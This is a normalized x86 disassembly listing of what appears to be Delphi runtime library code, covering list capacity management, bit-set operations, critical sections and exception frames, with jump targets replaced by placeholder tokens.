mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_4185f0
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41877c
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_41884c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41868c
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41889c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41875c
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4185f0
sub_4188bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41868c
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40270c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_4188f8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_41868c
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4188bc
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402b34
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_4185f0
dec ebp
inc edi
jne r-xdata
sub_41896c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4189c0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4034f4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418ac4
xor eax eax
push ebp
push sub_418a22
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403128
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403118
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a29
mov eax [ ebp - 0x4 ]
call sub_418b28
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_418a3c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418ac4
xor eax eax
push ebp
push sub_418ab8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4185a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41875c
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418abf
mov eax [ ebp - 0x4 ]
call sub_418b28
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_41868c
sub_418ad8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418ac4
xor eax eax
push ebp
push sub_418b1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41889c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b22
mov eax [ ebp - 0x4 ]
call sub_418b28
retn
sub_418b34
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_418b88
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_418b88
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_418b64
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026cc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402b34
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026ec
mov edx edi
mov eax ebp
call sub_418b7c
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028c8
sub_418c2c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_418b64
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_418b88
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_418c70
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_418ce8
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_41be7c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_418d28
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418dde
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f50
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403078
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40411c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403078
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418de5
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_418e04
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_418e99
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403078
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_40411c
mov eax ebx
mov si 0xffff
call sub_403324
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418ea0
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax ebx
mov si 0xffff
call sub_403324
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403324
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404238
sub_418eab
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_40337c
mov eax ebx
mov si 0xffff
call sub_403324
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403324
push eax
lea eax [ ebx + 0x4 ]
call sub_4057b4
mov ecx eax
mov edx r-xdata
pop eax
call sub_4031dc
sub_418f08
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_418f28
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_418f48
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031dc
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_418f70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_4057b4
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_403324
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax edi
call sub_4057b4
mov edx eax
mov eax esi
call sub_418f70
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_4057b4
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_419008
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_41905d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4057b4
mov edx eax
mov eax edi
call sub_418f70
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419064
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_41906c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov [ edi + 0x4 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
call sub_419108
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4190bc
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_4190f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_41911c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_419154
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ce8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_419184
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4191c0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_403078
mov edx esp
mov eax esi
call sub_40411c
add esp 0x100
pop esi
pop ebx
retn
sub_4191e8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41927d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_403078
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_40411c
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_403324
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_4191a8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f48
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419284
lea eax [ ebp - 0x14 ]
call sub_403eb8
retn
sub_4192a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4197bc
mov edx ebx
mov eax esi
call sub_419754
sub_4192d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4191a8
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_4187f4
mov dl 0x1
mov eax ebx
call sub_419184
sub_419300
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_419008
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_41934c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_419008
mov eax [ esi + 0x8 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ce8
test bl bl
jle r-xdata
mov eax esi
call sub_419464
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_419398
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4193b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_418d14
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_419436
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419464
mov eax esi
call sub_419538
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_419540
push eax
mov eax [ ebp - 0x4 ]
call sub_419398
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_419464
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4194be
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_4187e8
call sub_403128
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_4194d8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx esi
call sub_418700
cmp ebp [ eax + 0x8 ]
je r-xdata
sub_419518
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419540
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_419554
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419602
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_403078
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_40411c
mov eax ebx
mov si 0xffff
call sub_403324
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419609
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403edc
retn
mov eax ebx
mov si 0xffff
call sub_403324
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403324
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41961c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_404238
sub_41961c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_403f0c
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_403324
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403368
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403368
call sub_414948
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026cc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419719
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403368
mov edx [ ebp - 0xc ]
call sub_414b4c
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4026ec
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_414bd0
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_40411c
sub_419738
push ebx
push esi
mov esi edx
call sub_419398
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
pop esi
pop ebx
retn
sub_419754
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4032b4
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4185a4
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_419454
xor ecx ecx
mov edx esi
mov eax ebx
call sub_419008
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_41868c
sub_4197bc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_4187e8
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41889c
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4185f0
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_419008
mov eax ebx
call sub_419454
pop edi
pop esi
pop ebx
retn
sub_419818
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418700
mov edx eax
mov cl 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418700
call sub_403128
pop edi
pop esi
pop ebx
retn
sub_41985c
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_419880
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_419300
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4198c8
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a588
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ce8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4198f8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41991c
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_419940
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4199e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419a90
xor eax eax
push ebp
push sub_4199ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4199d1
mov eax [ ebp - 0x4 ]
call sub_419b4c
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4199f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418d14
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_419a90
xor eax eax
push ebp
push sub_419a78
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419b4c
retn
sub_419aa8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
